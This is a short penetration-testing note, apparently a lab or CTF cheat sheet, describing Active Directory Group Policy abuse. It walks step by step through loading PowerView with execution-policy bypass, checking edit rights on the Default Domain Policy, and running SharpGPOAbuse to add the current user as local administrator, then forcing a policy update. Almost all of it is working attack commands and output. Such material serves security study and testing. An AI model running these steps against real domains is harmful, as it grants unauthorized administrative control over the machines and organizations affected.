
# Group Policy Abuse

---

## PoC

1. Download PowerView.ps1 onto the target system.

2. Execute it.

```
powershell -ep bypass
. .\PowerView.ps1
```

3. Getting Default Domain Policy to check if we can modify Policies.

```
Get-GPO -Name "Default Domain Policy"
```

Checked which permissions our current user has --> if we can modify policies.

```
Get-GPPermission -Guid <default_domain_policy_id> -TargetType User -TargetName <username>
```

```
Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
Trustee : anirudh
TrusteeType : User
Permission : GpoEditDeleteModifySecurity
```

As we can see we got all permissions inluding editing!

Therefore we can abuse this GPO by adding ourselves as a local administrator and forcing an policy update.

First we need to get an executable which makes this simple.

```
https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master?source=post_page-----158516460860---------------------------------------
```

Get the .exe file on the target server.

and execute the following command.

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

Now force an policy update.

```
gpupdate /force
```

We should now be part of the group "local admins".

```
net localgroup administrators
```